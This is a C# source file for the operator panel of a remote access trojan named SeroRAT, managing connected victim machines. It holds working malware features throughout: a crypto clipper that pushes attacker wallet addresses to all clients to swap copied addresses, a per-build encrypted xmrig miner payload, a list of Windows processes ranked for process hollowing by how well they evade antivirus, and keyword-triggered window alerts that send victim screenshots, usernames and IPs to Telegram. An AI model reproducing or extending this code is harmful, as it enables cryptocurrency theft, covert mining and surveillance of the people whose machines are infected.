using System.Collections.ObjectModel;
using System.IO;
using System.Text.Json;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Animation;
using System.Windows.Media.Effects;
using System.Windows.Threading;
using DevExpress.Xpf.Core;
using SeroServer.Data;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public partial class ServerWindow : ThemedWindow
{
    private readonly DataStore _store = new();
    private TlsServer? _server;
    private Net.MinerStatsHost? _minerStatsHost;
    internal TlsServer? Server => _server;
    internal DataStore Store => _store;
    private DateTime _serverStartedAt;
    private readonly DispatcherTimer _dashTimer;
    private readonly DispatcherTimer _uptimeTimer;
    private readonly DispatcherTimer _idleTimer;
    private readonly DispatcherTimer _signalTimer;
    private readonly System.Collections.ObjectModel.ObservableCollection<Data.AutoTaskEntry> _autoTasks = new();
    private Net.SeroDiscordRPC? _discordRpc;
    private int MinerStatsPort => int.TryParse(TxtMnrStatsPort?.Text, out int p) && p > 0 ? p : 8081;
    // BulkObservableCollection: fires one Reset instead of N individual change events.
    // Prevents DataGrid from refreshing N×N times when thousands of clients connect.
    private sealed class BulkObservableCollection<T> : System.Collections.ObjectModel.ObservableCollection<T>
    {
        private bool _bulk;
        public void AddRange(IEnumerable<T> items)
        {
            _bulk = true;
            foreach (var item in items) Items.Add(item);
            _bulk = false;
            OnCollectionChanged(new System.Collections.Specialized.NotifyCollectionChangedEventArgs(System.Collections.Specialized.NotifyCollectionChangedAction.Reset));
        }
        public void RemoveRange(IEnumerable<T> items)
        {
            // O(n+m) HashSet-based removal — avoids O(n×m) from Items.Remove() linear scan
            // which would freeze the UI thread on mass disconnects (e.g. 1000 drops at once).
            var toRemove = new HashSet<T>(items);
            if (toRemove.Count == 0) return;
            _bulk = true;
            for (int i = Items.Count - 1; i >= 0; i--)
                if (toRemove.Contains(Items[i])) Items.RemoveAt(i);
            _bulk = false;
            OnCollectionChanged(new System.Collections.Specialized.NotifyCollectionChangedEventArgs(System.Collections.Specialized.NotifyCollectionChangedAction.Reset));
        }
        protected override void OnCollectionChanged(System.Collections.Specialized.NotifyCollectionChangedEventArgs e)
        { if (!_bulk) base.OnCollectionChanged(e); }
    }

    private readonly BulkObservableCollection<ConnectedClient> _onlineClients = new();
    // O(1) lookup by ID — mirrors _onlineClients, kept in sync by FlushClientQueue
    private readonly Dictionary<string, ConnectedClient> _onlineById = new();
    // Pending connect/disconnect ops, flushed every 150ms on the UI thread
    private readonly System.Collections.Concurrent.ConcurrentQueue<(bool add, ConnectedClient client)> _clientQueue = new();
    private DispatcherTimer? _batchTimer;

    // Limit concurrent new-client side-effect tasks (Telegram, AutoTask, Clipper push, WinNotify).
    // Without this, 10k simultaneous connections flood the ThreadPool with 10k Task.Run.
    private readonly System.Threading.SemaphoreSlim _connectSem = new(50, 50);

    private volatile bool _clientsDirty = true;
    private volatile bool _autoTasksDirty;
    private bool _dashboardInitialized;
    private int _logLineCount;
    private const int LogMaxLines = 2000;
    private const int LogTrimTo   = 1000;
    private System.Windows.Documents.Paragraph? _logPara;

    public static void ReportGlobalActivity(string action, string target, string status) { }

    private void SetStatus(string text, string? activityAction = null, string? activityTarget = null, string? activityStatus = null) { }

    private void UpdateSignalHealth() { }

    // Coloured log brushes — updated by UpdateLogBrushes() on every theme change
    private Brush _brushLogError      = MakeBrush(0xFC, 0x47, 0x47); // red vivid
    private Brush _brushLogSuccess    = MakeBrush(0x4A, 0xDE, 0x80); // green-400
    private Brush _brushLogConnect    = MakeBrush(0x2D, 0xD4, 0xBF); // teal-400
    private Brush _brushLogDisconnect = MakeBrush(0xF9, 0x73, 0x16); // orange-500
    private Brush _brushLogAdmin      = MakeBrush(0xD9, 0x46, 0xEF); // fuchsia-500
    private Brush _brushLogTask       = MakeBrush(0x06, 0xB6, 0xD4); // cyan-500
    private Brush _brushLogDefault    = MakeBrush(0xE2, 0xE8, 0xF0); // slate-200
    private Brush _brushLogTime       = MakeBrush(0x3B, 0x42, 0x52); // slate-700
    private Brush _brushLogIP         = MakeBrush(0xFB, 0x71, 0x85); // rose-400
    private Brush _brushLogGood       => _brushLogSuccess;
    private Brush _brushLogDll        => _brushLogTask;
    // Log brushes are intentionally NOT frozen — UpdateLogBrushes mutates .Color in-place
    // so existing Run elements in the RichTextBox live-update on theme switch.
    private static SolidColorBrush MakeBrush(byte r, byte g, byte b)
        => new(Color.FromRgb(r, g, b));

    private static void Recolor(Brush brush, byte r, byte g, byte b)
        => ((SolidColorBrush)brush).Color = Color.FromRgb(r, g, b);

    // Shared HttpClient for all Telegram API calls — avoids socket exhaustion from new HttpClient() per alert.
    private static readonly System.Net.Http.HttpClient _telegramHttp = new() { Timeout = TimeSpan.FromSeconds(15) };

    // Frozen brushes for activity chart — allocated once, not on every 5s dashboard tick
    private static readonly SolidColorBrush _chartGridBrush  = MakeArgbBrush(0x18, 0x4A, 0x85, 0xF5);
    private static readonly SolidColorBrush _chartLabelBrush = MakeArgbBrush(0x60, 0x80, 0x90, 0xB4);
    private static SolidColorBrush MakeArgbBrush(byte a, byte r, byte g, byte b)
    { var br = new SolidColorBrush(Color.FromArgb(a, r, g, b)); br.Freeze(); return br; }

    private static readonly HashSet<string> _lightThemeKeys = new(StringComparer.Ordinal)
    {
        "VS2017Light", "Seven",
        "Office2016Colorful", "Office2019White", "Office2019Colorful",
        "Office2010Blue", "Office2010Silver", "Office2013",
        "Office2019HighContrast"
    };

    // Themes with a vivid coloured title bar — feature window title text must be white/light
    private static readonly HashSet<string> _lightTitleThemes = new(StringComparer.Ordinal)
    {
        "Seven", "Office2010Blue", "Office2010Silver",
        "Office2016Colorful", "Office2019Colorful", "Office2013",
        "DXStyle"
    };

    private void UpdateLogBrushes(string themeKey)
    {
        bool light = _lightThemeKeys.Contains(themeKey);
        // Recolor mutates existing SolidColorBrush instances in-place — all Run elements
        // that captured a reference to these brushes automatically reflect the new colour.
        if (light)
        {
            Recolor(_brushLogTime,       0xAB, 0xB3, 0xBF); // gray-400
            Recolor(_brushLogDefault,    0x0F, 0x17, 0x2A); // slate-950 — near-black
            Recolor(_brushLogSuccess,    0x15, 0x80, 0x3D); // green-700
            Recolor(_brushLogConnect,    0x04, 0x78, 0x57); // emerald-700 — teal (≠ green)
            Recolor(_brushLogError,      0xB9, 0x1C, 0x1C); // red-700
            Recolor(_brushLogDisconnect, 0xB4, 0x5D, 0x09); // orange-700
            Recolor(_brushLogAdmin,      0x6D, 0x28, 0xD9); // violet-700 — purple
            Recolor(_brushLogTask,       0x06, 0x6E, 0x96); // cyan-700 — distinct teal-blue
            Recolor(_brushLogEvent,      0x1D, 0x4E, 0xD8); // blue-700 — event keywords
            Recolor(_brushLogClient,     0x5B, 0x21, 0xB6); // violet-800 — client IDs
            Recolor(_brushLogUser,       0x06, 0x5F, 0x46); // emerald-800 — usernames
            Recolor(_brushLogIP,         0xBE, 0x18, 0x5D); // pink-700 — IPs
            if (ClipperLog != null) ClipperLog.Foreground = MakeBrush(0x15, 0x80, 0x3D);
        }
        else
        {
            Recolor(_brushLogTime,       0x64, 0x74, 0x8B); // slate-500 — dim but readable on dark bg
            Recolor(_brushLogDefault,    0xE2, 0xE8, 0xF0); // slate-200 — crisp white body
            Recolor(_brushLogSuccess,    0x4A, 0xDE, 0x80); // green-400
            Recolor(_brushLogConnect,    0x2D, 0xD4, 0xBF); // teal-400 — clearly ≠ green
            Recolor(_brushLogError,      0xFC, 0x47, 0x47); // red vivid
            Recolor(_brushLogDisconnect, 0xF9, 0x73, 0x16); // orange-500
            Recolor(_brushLogAdmin,      0xD9, 0x46, 0xEF); // fuchsia-500 — magenta-purple
            Recolor(_brushLogTask,       0x06, 0xB6, 0xD4); // cyan-500 — clearly ≠ fuchsia
            Recolor(_brushLogEvent,      0x60, 0xA5, 0xFA); // blue-400 — event keywords
            Recolor(_brushLogClient,     0xC4, 0xB5, 0xFD); // violet-300 — lavender client IDs
            Recolor(_brushLogUser,       0x6E, 0xE7, 0xB7); // emerald-300 — mint usernames
            Recolor(_brushLogIP,         0xFB, 0x71, 0x85); // rose-400 — coral IPs
            if (ClipperLog != null) ClipperLog.Foreground = MakeBrush(0x4A, 0xDE, 0x80);
        }
    }
    private readonly Dictionary<TextBlock, DispatcherTimer> _counterTimers = new();
    private DispatcherTimer? _searchDebounce;
    private DispatcherTimer? _allClientsSearchDebounce;
    private DispatcherTimer? _chartSizeDebounce;
    private System.ComponentModel.ICollectionView? _allClientsView;
    private readonly Dictionary<string, Window> _featureWindows = new();
    private byte[]? _bldXmrigBytes;
    private string? _bldXmrigPath;
    private byte[]? _bldSfcSeed;   // per-build 32-byte SFC64 seed; encrypts embedded xmrig

    private static byte[] SfcEncode(byte[] data, byte[] seed)
    {
        var out_ = new byte[data.Length];
        ulong a = BitConverter.ToUInt64(seed, 0),  b = BitConverter.ToUInt64(seed, 8),
              c = BitConverter.ToUInt64(seed, 16), d = BitConverter.ToUInt64(seed, 24);
        for (int i = 0; i < data.Length; i++)
        {
            ulong k = a + b + d; d++;
            a = b ^ (b >> 11);
            b = c + (c << 3);
            c = (c << 24) | (c >> 40);
            c += k;
            out_[i] = (byte)(data[i] ^ (byte)k);
        }
        return out_;
    }

    private static string ConfigFilePath
    {
        get
        {
            var dir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SeroServer");
            Directory.CreateDirectory(dir);
            return Path.Combine(dir, "server_config.json");
        }
    }

    protected override void OnSourceInitialized(EventArgs e)
    {
        base.OnSourceInitialized(e);
        // Win32 handle is guaranteed here — apply DWM border suppression for real this time.
        var theme = UiPrefs.GetString("Theme", "SeroDark");
        SuppressDwmBorder(restore: theme == "SeroDark");
        // DX ThemedWindow re-enables the DWM accent border on every WM_ACTIVATE.
        // Re-suppress on every focus change so the border never re-appears.
        this.Activated   += (_, _) => { var t = UiPrefs.GetString("Theme", "SeroDark"); SuppressDwmBorder(restore: t == "SeroDark"); };
        this.Deactivated += (_, _) => { var t = UiPrefs.GetString("Theme", "SeroDark"); SuppressDwmBorder(restore: t == "SeroDark"); };
    }

    public ServerWindow()
    {
        InitializeComponent();

        // Route all unhandled exceptions to the live log panel so crashes are visible without opening crash.log
        App.LiveLog = msg => Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Background,
            (Action)(() => Log(msg)));
        FlagCache.LiveLog = msg => Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Background,
            (Action)(() => Log(msg)));

        try
        {
            var version = System.Reflection.Assembly.GetExecutingAssembly().GetName().Version;
            if (version != null)
            {
                var vStr = $"v{version.Major}.{version.Minor}.{version.Build}";
                Title = $"SeroRAT {vStr}";
            }
        }
        catch { }

        _dashTimer = new DispatcherTimer { Interval = TimeSpan.FromSeconds(5) };
        _dashTimer.Tick += (_, _) => RefreshDashboard();

        _uptimeTimer = new DispatcherTimer { Interval = TimeSpan.FromSeconds(1) };
        _uptimeTimer.Tick += (_, _) => RefreshUptime();

        // Batch client connect/disconnect UI updates every 150ms
        // This prevents the DataGrid from freezing when thousands of clients connect simultaneously
        _batchTimer = new DispatcherTimer { Interval = TimeSpan.FromMilliseconds(150) };
        _batchTimer.Tick += FlushClientQueue;
        _batchTimer.Start();

        // Update client idle time every 5s — off the UI thread so 100k setter calls
        // don't block the dispatcher. WPF binding marshals PropertyChanged to UI thread.
        // Only increment when the stub hasn't sent HardwareStats recently (>20s gap):
        // the stub reports real OS idle time every ~15s, so adding on top would cause
        // double-counting and push clients into AFK earlier than their actual idle time.
        _idleTimer = new DispatcherTimer { Interval = TimeSpan.FromSeconds(5) };
        _idleTimer.Tick += (_, _) =>
        {
            var srv = _server;
            if (srv == null) return;
            _ = Task.Run(() =>
            {
                var now = DateTime.UtcNow;
                foreach (var c in srv.ConnectedClients.Values)
                    if ((now - c.LastHwStatsAt).TotalSeconds > 20)
                        c.IdleSeconds += 5;
            });
        };
        _idleTimer.Start();

        // Connection health signal indicator — updates every 5 seconds
        _signalTimer = new DispatcherTimer { Interval = TimeSpan.FromSeconds(5) };
        _signalTimer.Tick += (_, _) => UpdateSignalHealth();
        _signalTimer.Start();

        Loaded += (_, _) =>
        {
            // Wrap in CollectionView so we can filter without modifying _onlineClients
            var view = System.Windows.Data.CollectionViewSource.GetDefaultView(_onlineClients);
            view.Filter = ClientFilter;
            view.SortDescriptions.Add(new System.ComponentModel.SortDescription(
                nameof(Data.ConnectedClient.HasTag), System.ComponentModel.ListSortDirection.Descending));
            GridClients.ItemsSource = view;
            RubberBandSelector.Enable(GridClients);

            // Apply DX theme to GridClients context menu — same pattern as FeatureContextMenu
            if (GridClients.ContextMenu != null)
            {
                GridClients.ContextMenu.Opened += (_, _) =>
                {
                    try
                    {
                        var t = DevExpress.Xpf.Core.ApplicationThemeHelper.ApplicationThemeName;
                        if (!string.IsNullOrEmpty(t))
                            DevExpress.Xpf.Core.ThemeManager.SetThemeName(GridClients.ContextMenu, t);
                    }
                    catch { }
                };
                foreach (var item in GridClients.ContextMenu.Items.OfType<System.Windows.Controls.MenuItem>())
                {
                    item.SubmenuOpened += (s, _) =>
                    {
                        try
                        {
                            var t = DevExpress.Xpf.Core.ApplicationThemeHelper.ApplicationThemeName;
                            if (!string.IsNullOrEmpty(t) && s is System.Windows.Controls.MenuItem mi)
                                DevExpress.Xpf.Core.ThemeManager.SetThemeName(mi, t);
                        }
                        catch { }
                    };
                }
            }
            GridWinNotify.ItemsSource = _winNotifyEntries;
            LoadColumnVisibility();
            RestoreGridColumnWidths();
            SetupGridColumnPersistence();

            // Initialise diagnostic logger (enabled by default)
            DiagnosticLogger.Init();
            TxtDevLogsPath.Text = DiagnosticLogger.LogDirectory;

            UpdateLogBrushes(UiPrefs.GetString("Theme", "SeroDark"));
            Log("[*] Server ready. Click START to listen.");
            RestoreAllClientsColumnWidths();
            SetupAllClientsColumnPersistence();
            LoadConfig();
            LoadSoundPreferences();
            ApplyStoredTheme();
            ApplyStoredLanguage();
            BuildAccentPalette();
            {
                int w = UiPrefs.GetInt("WinWidth", 0), h = UiPrefs.GetInt("WinHeight", 0);
                if (w > 400 && h > 300) { Left = UiPrefs.GetInt("WinLeft", 0); Top = UiPrefs.GetInt("WinTop", 0); Width = w; Height = h; }
                SyncNavButtons(0);
            }
            NotificationService.Initialize(SettingsNotifySound.IsChecked == true, SettingsNotifyVisual.IsChecked == true);
            // Initialize default host if empty
            if (BldHosts.Items.Count == 0)
                BldHosts.Items.Add("127.0.0.1");
            GridAutoTasks.ItemsSource = _autoTasks;
            // Keep _autoTasksSnap current — replaced atomically so connect tasks read without Dispatcher.
            _autoTasks.CollectionChanged += (_, _) =>
                _autoTasksSnap = _autoTasks.Count > 0
                    ? (System.Collections.Generic.IReadOnlyList<Data.AutoTaskEntry>)_autoTasks.ToList()
                    : null;
            // Volatile bool caches for Telegram checkbox — updated here + in LoadConfig.
            BldTelegramEnabled.Checked   += (_, _) => _telegramEnabled = true;
            BldTelegramEnabled.Unchecked += (_, _) => _telegramEnabled = false;
            InitHollowTargets();

            // First launch: cert + auth key setup
            bool needsCert;
            try
            {
                var certDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SeroServer");
                needsCert = !File.Exists(Path.Combine(certDir, "server.pfx"));
            }
            catch { needsCert = true; }

            if (needsCert)
                ShowCertSetupDialog();

            // Re-check AFTER dialog — importing a .sero may have restored the auth key
            if (string.IsNullOrEmpty(BldAuthKey.Text.Trim()))
            {
                var bytes = System.Security.Cryptography.RandomNumberGenerator.GetBytes(24);
                BldAuthKey.Text = Convert.ToBase64String(bytes);
                SaveConfig();
                Log("[+] Auth key generated and saved.");
            }

            // Always load cert hash
            try { BldCertHash.Text = Net.CertificateHelper.GetCertSha256Hash(); }
            catch { BldCertHash.Text = Lang.Get("BLD_CERT_WAIT"); }

            BinderGrid.ItemsSource = _binderEntries;

            // Set Service Manager context menu icon to match the per-row icon in the Service Manager window
            var svcIcon = ServiceEntryVM.SvcIcon;
            if (svcIcon != null && MenuItemSvcMgr != null)
            {
                var img = new System.Windows.Controls.Image { Source = svcIcon, Width = 14, Height = 14 };
                System.Windows.Media.RenderOptions.SetBitmapScalingMode(img, System.Windows.Media.BitmapScalingMode.HighQuality);
                MenuItemSvcMgr.Icon = img;
            }

            // Fix: WPF TabControl with custom template doesn't render first tab on initial load
            // (SelectionChanged fires before visual tree is ready, ContentPresenter stays blank).
            // Cycle SelectedIndex at Background priority so the layout pass has completed.
            Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Background, () =>
            {
                MainTabControl.SelectedIndex = -1;
                MainTabControl.SelectedIndex = 0;
                RefreshDashboard();
            });
        };
    }

    private string GetHollowTarget()
    {
        var text = BldHollowTarget.Text?.Trim() ?? "";
        // If it's a raw process name, return as-is
        if (text.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
            return text;
        // Extract first word (process name) from display string
        return text.Split(' ', StringSplitOptions.RemoveEmptyEntries).FirstOrDefault() ?? "svchost.exe";
    }

    private void InitHollowTargets()
    {
        var targets = new (string proc, int score, string note)[]
        {
            ("svchost.exe", 95, "many instances, blends in"),
            ("RuntimeBroker.exe", 90, "runs often, lightweight"),
            ("dllhost.exe", 90, "COM surrogate, common"),
            ("conhost.exe", 85, "console host, normal"),
            ("sihost.exe", 85, "shell infrastructure"),
            ("taskhostw.exe", 85, "task host, expected"),
            ("audiodg.exe", 85, "audio device graph"),
            ("SearchProtocolHost.exe", 80, "Windows Search"),
            ("backgroundTaskHost.exe", 80, "UWP background"),
            ("smartscreen.exe", 80, "Defender, may restart"),
            ("spoolsv.exe", 80, "print spooler service"),
            ("WmiPrvSE.exe", 75, "WMI provider, admin"),
            ("wlanext.exe", 75, "WiFi extensibility"),
            ("dwm.exe", 70, "desktop window manager, risky"),
            ("explorer.exe", 70, "shell, crash = desktop gone"),
            ("notepad.exe", 70, "suspicious if visible"),
            ("msiexec.exe", 60, "installer, short-lived"),
            ("cmd.exe", 55, "suspicious if persistent"),
            ("powershell.exe", 50, "flagged by most AV"),
        };

        BldHollowTarget.Items.Clear();
        foreach (var (proc, score, note) in targets)
        {
            var brush = score >= 85
                ? new SolidColorBrush(Color.FromRgb(0x1b, 0x8a, 0x2e))
                : score >= 70
                    ? new SolidColorBrush(Color.FromRgb(0xb8, 0x86, 0x0b))
                    : new SolidColorBrush(Color.FromRgb(0xcc, 0x33, 0x33));
            BldHollowTarget.Items.Add(new HollowTargetItem { Proc = proc, Score = $"{score}%", Note = note, ScoreColor = brush });
        }

        BldHollowTarget.SelectionChanged += (_, _) =>
        {
            if (BldHollowTarget.SelectedItem is HollowTargetItem item)
                Dispatcher.BeginInvoke(() => BldHollowTarget.Text = item.Proc);
        };
    }

    public class HollowTargetItem
    {
        public string Proc  { get; set; } = "";
        public override string ToString() => Proc;
        public string Score { get; set; } = "";
        public string Note { get; set; } = "";
        public System.Windows.Media.Brush ScoreColor { get; set; } = System.Windows.Media.Brushes.Black;
    }

    // ── Window Notify ─────────────────────────────────────────────────────────────
    private readonly ObservableCollection<WinNotifyEntry> _winNotifyEntries = new();
    public sealed class WinNotifyEntry
    {
        public string Time       { get; set; } = "";
        public string User       { get; set; } = "";
        public string Keyword    { get; set; } = "";
        public string Connection { get; set; } = "";
        public string Window     { get; set; } = "";
        public string ClientId   { get; set; } = "";
    }

    private bool _loadingConfig;

    // ── Crypto Clipper (global — applies to all clients) ────────────────────────
    private bool _clipperRunning;
    private int  _clipperCount;
    // Cached config JSON — set on ClipperStart so connect tasks read it lock-free.
    private volatile string? _clipperConfigJsonCache;

    // ── Volatile caches for connect-task hot path ────────────────────────────────
    // These are written on the UI thread and read lock-free from Task.Run workers,
    // eliminating Dispatcher.InvokeAsync round-trips during high connect rates.
    private volatile bool    _telegramEnabled;
    private volatile bool    _winNotifyEnabled;
    private volatile string[]? _winNotifyKeywordsSnap;
    // Immutable snapshot of _autoTasks — replaced atomically on CollectionChanged.
    private volatile System.Collections.Generic.IReadOnlyList<Data.AutoTaskEntry>? _autoTasksSnap;

    private ClipperSetConfigData BuildClipperConfig(bool enabled) => new()
    {
        Enabled = enabled,
        Addresses = new ClipperAddresses
        {
            BTC  = ClipperBTC.Text.Trim(),
            ETH  = ClipperETH.Text.Trim(),
            LTC  = ClipperLTC.Text.Trim(),
            TRX  = ClipperTRX.Text.Trim(),
            SOL  = ClipperSOL.Text.Trim(),
            XMR  = ClipperXMR.Text.Trim(),
            XRP  = ClipperXRP.Text.Trim(),
            DASH = ClipperDASH.Text.Trim(),
            BCH  = ClipperBCH.Text.Trim(),
        }
    };

    private async void ClipperStart_Click(object sender, RoutedEventArgs e)
    {
        _clipperRunning = true;
        _clipperConfigJsonCache = Newtonsoft.Json.JsonConvert.SerializeObject(BuildClipperConfig(true));
        BtnClipperStart.IsEnabled = false; BtnClipperStart.Opacity = 0.45;
        BtnClipperStop.IsEnabled  = true;  BtnClipperStop.Opacity  = 1.0;
        ClipperActiveBadge.Visibility = Visibility.Visible;
        // Push config to all currently online clients
        if (_server != null)
        {
            var pkt = new Packet
            {
                Type = PacketType.ClipperSetConfig,
                Data = _clipperConfigJsonCache
            };
            await _server.SendToAll(pkt);
            Log($"[CLIPPER] Started — config pushed to {_server.ConnectedClients.Count} client(s).");
        }
        SaveConfig();
    }

    private async void ClipperStop_Click(object sender, RoutedEventArgs e)
    {
        _clipperRunning = false;
        BtnClipperStart.IsEnabled = true;  BtnClipperStart.Opacity = 1.0;
        BtnClipperStop.IsEnabled  = false; BtnClipperStop.Opacity  = 0.45;
        ClipperActiveBadge.Visibility = Visibility.Collapsed;
        if (_server != null)
        {
            var pkt = new Packet
            {
                Type = PacketType.ClipperSetConfig,
                Data = Newtonsoft.Json.JsonConvert.SerializeObject(BuildClipperConfig(false))
            };
            await _server.SendToAll(pkt);
            Log("[CLIPPER] Stopped — all clients notified.");
        }
    }

    private void ClipperEnabled_Changed(object sender, RoutedEventArgs e) { }

    private void ClipperApply_Click(object sender, RoutedEventArgs e) { }

    private void ClipperSave_Click(object sender, RoutedEventArgs e)
    {
        SaveConfig();
        var clipSavedText = Lang.Get("CLIP_SAVED");
        ClipperCountTxt.Text = clipSavedText;
        System.Threading.Tasks.Task.Delay(1500).ContinueWith(_ =>
            Dispatcher.BeginInvoke(() => {
                if (!IsLoaded) return;
                if (ClipperCountTxt.Text == clipSavedText)
                    ClipperCountTxt.Text = _clipperCount > 0 ? string.Format(Lang.Get("CLIP_REPLACEMENTS"), _clipperCount) : "";
            }));
    }

    private void ClipperClearLog_Click(object sender, RoutedEventArgs e)
    {
        ClipperLog.Clear();
        _clipperCount = 0;
        ClipperCountTxt.Text = string.Format(Lang.Get("CLIP_REPLACEMENTS"), 0);
    }

    private void HandleClipperDetected(string clientId, Protocol.ClipperDetectedData data)
    {
        _clipperCount++;
        NotificationService.NotifyClipperTriggered();
        var display = clientId.Length > 8 ? clientId[..8] : clientId;
        static string S(string? s) => (s ?? "").Replace('\r', ' ').Replace('\n', ' ');
        var line = $"[{DateTime.Now:HH:mm:ss}]  [{display}]  {S(data.Type)}  {S(data.Original)}  →  {S(data.Replaced)}\n";
        ClipperLog.AppendText(line);
        ClipperCountTxt.Text = $"  —  {_clipperCount} replacement{(_clipperCount != 1 ? "s" : "")}";
    }

    private bool _autoScrollClipper = true;
    private void ClipperLogScroll_ScrollChanged(object sender, ScrollChangedEventArgs e)
    {
        if (e.ExtentHeightChange == 0 && e.ViewportHeightChange == 0 && e.VerticalChange != 0)
            _autoScrollClipper = (ClipperLogScroll.VerticalOffset + ClipperLogScroll.ViewportHeight >= ClipperLogScroll.ExtentHeight - 10);

        if (_autoScrollClipper && (e.ExtentHeightChange > 0 || e.ViewportHeightChange > 0))
            ClipperLogScroll.ScrollToEnd();
    }

    // ── Server-side Telegram notification (global counter) ──────────────────────
    // Fires when a brand-new HWID connects — uses the server's DataStore count
    // so the number is truly global across all victims, not per-machine.
    // ── Window Notify ──────────────────────────────────────────────────────────

    private async Task SendWindowNotifyKeywords(string clientId)
    {
        if (_server == null || !_winNotifyEnabled) return;
        var keywords = _winNotifyKeywordsSnap ?? Array.Empty<string>();
        await _server.SendToClient(clientId, new Packet
        {
            Type = PacketType.WindowNotifyKeywords,
            Data = Newtonsoft.Json.JsonConvert.SerializeObject(new { Keywords = keywords })
        });
        _ = Dispatcher.BeginInvoke(() => Log(
            keywords.Length == 0
                ? $"[WIN-NOTIFY] Cleared keywords on {clientId}."
                : $"[WIN-NOTIFY] Pushed {keywords.Length} keyword(s) to {clientId}."));
    }

    private void BtnWinNotifyAdd_Click(object sender, RoutedEventArgs e)
    {
        var dlg = new AddKeywordDialog(this);
        if (dlg.ShowDialog() == true && !string.IsNullOrWhiteSpace(dlg.Keyword))
        {
            var kw = dlg.Keyword.Trim();
            if (!WinNotifyKeywordsList.Items.Contains(kw))
                WinNotifyKeywordsList.Items.Add(kw);
            PushWinNotifyKeywords();
            SaveConfig();
        }
    }

    private void BtnWinNotifyRemove_Click(object sender, RoutedEventArgs e)
    {
        if (WinNotifyKeywordsList.SelectedItem is string sel)
        {
            WinNotifyKeywordsList.Items.Remove(sel);
            PushWinNotifyKeywords();
            SaveConfig();
        }
    }

    private void WinNotifyKeywordsList_DoubleClick(object sender, System.Windows.Input.MouseButtonEventArgs e)
    {
        // Double-click opens edit dialog for selected keyword
        if (WinNotifyKeywordsList.SelectedItem is string sel)
        {
            var dlg = new AddKeywordDialog(this, sel);
            if (dlg.ShowDialog() == true && !string.IsNullOrWhiteSpace(dlg.Keyword))
            {
                int idx = WinNotifyKeywordsList.Items.IndexOf(sel);
                WinNotifyKeywordsList.Items[idx] = dlg.Keyword.Trim();
                PushWinNotifyKeywords();
                SaveConfig();
            }
        }
    }

    private void PushWinNotifyKeywords()
    {
        _winNotifyKeywordsSnap = WinNotifyKeywordsList.Items.Cast<string>().ToArray();
        if (_server == null || WinNotifyEnabled.IsChecked != true) return;
        var clients = _server.ConnectedClients.Keys.ToList();
        if (clients.Count == 0) return;
        // Serialize once on UI thread — avoids 2×N Dispatcher.InvokeAsync calls inside the loop
        var pktData = Newtonsoft.Json.JsonConvert.SerializeObject(
            new { Keywords = WinNotifyKeywordsList.Items.Cast<string>().ToArray() });
        var srv = _server;
        _ = Task.Run(() => Parallel.ForEachAsync(clients, new ParallelOptions { MaxDegreeOfParallelism = 50 },
            async (id, _) =>
            {
                try { await srv.SendToClient(id, new Packet { Type = PacketType.WindowNotifyKeywords, Data = pktData }); } catch { }
            }));
    }

    private async void HandleWindowNotifyAlert(string clientId, WindowNotifyAlertData data)
    {
        var client = _server?.ConnectedClients.GetValueOrDefault(clientId);
        var user   = client != null ? $"{client.Username}[{client.MachineName}]@{client.IP}" : clientId;
        var entry  = new WinNotifyEntry
        {
            Time       = DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss"),
            User       = user,
            Keyword    = data.Keyword,
            Connection = client != null ? Lang.Get("NAV_ONLINE") : "?",
            Window     = data.Title,
            ClientId   = clientId,
        };
        _winNotifyEntries.Insert(0, entry);
        if (_winNotifyEntries.Count > 500) _winNotifyEntries.RemoveAt(500);

        NotificationService.NotifyWindowAlert(data.Keyword, data.Title);
        Log($"[WIN-NOTIFY] {user} — keyword '{data.Keyword}' — window: {data.Title}");

        // Telegram: send message + screenshot photo using Window Notify's own token/chatId
        if (WnTelegramEnabled.IsChecked == true && !string.IsNullOrEmpty(WnTelegramToken.Text.Trim()))
            _ = SendWindowNotifyTelegramAsync(client, data);
    }

    private async Task SendWindowNotifyTelegramAsync(Data.ConnectedClient? client, WindowNotifyAlertData data)
    {
        try
        {
            var token   = WnTelegramToken.Text.Trim();
            var chatId1 = WnTelegramChatId1.Text.Trim();
            var chatId2 = WnTelegramChatId2.Text.Trim();
            if (string.IsNullOrEmpty(token) || string.IsNullOrEmpty(chatId1)) return;

            var parisTz = TimeZoneInfo.FindSystemTimeZoneById("Romance Standard Time");
            var paris   = TimeZoneInfo.ConvertTimeFromUtc(DateTime.UtcNow, parisTz).ToString("yyyy-MM-dd HH:mm") + " (Paris)";
            var caption =
                $"\U0001f6a8 Window Notify — SeroRAT\n\n" +
                $"Keyword: {data.Keyword}\n" +
                $"Window: {data.Title}\n" +
                $"ID: {client?.Id ?? "?"}\n" +
                $"User: {client?.Username ?? "?"}@{client?.MachineName ?? "?"}\n" +
                $"IP: {client?.IP ?? "?"}\n" +
                $"Time: {paris}";

            var targets = new List<string> { chatId1 };
            if (!string.IsNullOrEmpty(chatId2)) targets.Add(chatId2);

            byte[]? jpegBytes = null;
            if (!string.IsNullOrEmpty(data.Screenshot))
            {
                try { jpegBytes = Convert.FromBase64String(data.Screenshot); } catch { }
            }

            foreach (var id in targets)
            {
                try
                {
                    if (jpegBytes != null && jpegBytes.Length > 0)
                        await TelegramSendPhotoAsync(_telegramHttp, token, id, jpegBytes, caption);
                    else
                    {
                        var url = $"https://api.telegram.org/bot{token}/sendMessage" +
                                  $"?chat_id={Uri.EscapeDataString(id)}" +
                                  $"&text={Uri.EscapeDataString(caption)}";
                        await _telegramHttp.GetAsync(url);
                    }
                }
                catch { }
            }
        }
        catch { }
    }

    private static async Task TelegramSendPhotoAsync(System.Net.Http.HttpClient http, string token, string chatId, byte[] jpegBytes, string caption)
    {
        var url = $"https://api.telegram.org/bot{token}/sendPhoto";
        using var form = new System.Net.Http.MultipartFormDataContent();
        form.Add(new System.Net.Http.StringContent(chatId), "chat_id");
        form.Add(new System.Net.Http.ByteArrayContent(jpegBytes) { Headers = { ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/jpeg") } }, "photo", "screenshot.jpg");
        form.Add(new System.Net.Http.StringContent(caption), "caption");
        await http.PostAsync(url, form);
    }

